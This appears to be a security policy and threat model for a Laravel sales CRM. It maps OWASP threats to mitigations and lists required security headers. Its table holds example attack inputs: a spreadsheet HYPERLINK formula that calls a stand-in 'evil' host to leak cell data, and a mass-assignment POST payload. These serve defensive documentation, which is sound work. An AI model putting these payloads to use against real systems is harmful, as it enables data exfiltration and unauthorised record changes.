# Security Policy & Threat Model — Sales CRM

**Last Updated:** 2026-11-19  
**Implementation Status:** `Implemented (Active Security Standard)`  
**Related Docs:** `docs/security/authentication.md`, `docs/security/authorization.md`, `docs/security/security-checklist.md`

## 1. Security Posture Overview

**Sales CRM** processes commercially sensitive B2B/B2C prospect data, contact PII, revenue pipelines, and pricing quotations. Every layer of the [Laravel 12](https://laravel.com/framework/docs/12.x/configuration) application must enforce **Defense-in-Depth**, **Least Privilege**, and **Default-Deny Authorization**.

## 2. Core Threat Model & Mitigation Matrix

| Threat Vector (OWASP Top 10) | CRM Attack Scenario | Mandatory Mitigation Control | Reference Doc |
| :--- | :--- | :--- | :--- |
| **Broken Access Control / IDOR** | Sales Rep modifies URL `/deals/42` to view/edit another team's deal | Combine `VisibleToUserScope` query scoping + Laravel `DealPolicy` check on every action | `docs/security/authorization.md` |
| **Mass Assignment** | Attacker injects `owner_id=1&team_id=2&status=won` in POST body | Strict `$fillable` on models + `Model::preventSilentlyDiscardingAttributes()` + FormRequest whitelisting | `docs/security/input-validation.md` |
| **Cross-Site Scripting (XSS)** | Malicious `<script>` injected in Lead notes or Contact name | Strict Blade `{{ $var }}` escaping + `Content-Security-Policy` headers; never use `{!! !!}` on user input | `docs/security/input-validation.md` |
| **SQL Injection (SQLi)** | Crafted filter/sort query parameter in reports or search | Parameterized Eloquent bindings + strict column whitelist (`Rule::in([...])`) on dynamic `orderBy` | `docs/security/input-validation.md` |
| **Cross-Site Request Forgery (CSRF)** | Forged POST request changing deal stage or exporting contacts | `ValidateCsrfToken` middleware + `@csrf` in forms + `X-CSRF-TOKEN` in Vanilla JS `fetch` | `docs/security/authentication.md` |
| **Malicious File Upload / RCE** | Uploading `.php` or `.svg` script disguised as quotation attachment | Strict server-side MIME + extension validation, randomized storage filenames on non-public `private` disk | `docs/security/file-upload-security.md` |
| **CSV Formula Injection** | Uploading lead name `=HYPERLINK("http://evil/leak",A1)` | Prefix leading `=`, `+`, `-`, `@`, `	`, `
` characters with `'` during CSV export/import | `docs/modules/import-and-export.md` |
| **Credential Stuffing / Brute Force** | Automated login attempts against sales rep accounts | `RateLimiter` throttling (5 attempts/minute per email+IP), Argon2id/Bcrypt hashing, audit logging | `docs/security/authentication.md` |

## 3. Mandatory HTTP Security Headers (`SecurityHeadersMiddleware`)

Every HTTP response must include:
- `X-Frame-Options: DENY`
- `X-Content-Type-Options: nosniff`
- `Referrer-Policy: strict-origin-when-cross-origin`
- `Permissions-Policy: camera=(), microphone=(), geolocation=()`
- `Strict-Transport-Security: max-age=31536000; includeSubDomains` (in HTTPS production)
